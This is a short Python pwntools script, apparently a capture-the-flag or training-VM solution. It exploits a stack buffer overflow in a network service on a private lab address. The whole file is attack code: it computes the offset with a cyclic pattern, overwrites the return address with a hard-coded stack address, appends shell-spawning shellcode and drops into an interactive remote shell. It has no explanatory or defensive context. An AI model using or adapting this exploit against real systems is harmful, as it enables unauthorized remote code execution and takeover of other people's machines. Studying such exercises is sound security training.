from pwn import *
io = remote('192.168.56.101',2995)
eip = 0x66616169
if not eip:
	io.sendline(cyclic(600))
exploit = cyclic(cyclic_find(eip)-1)
exploit +='\x00'
exploit += pack(0xbffffc60)
exploit += asm(shellcraft.sh())
io.sendline(exploit)
io.interactive()

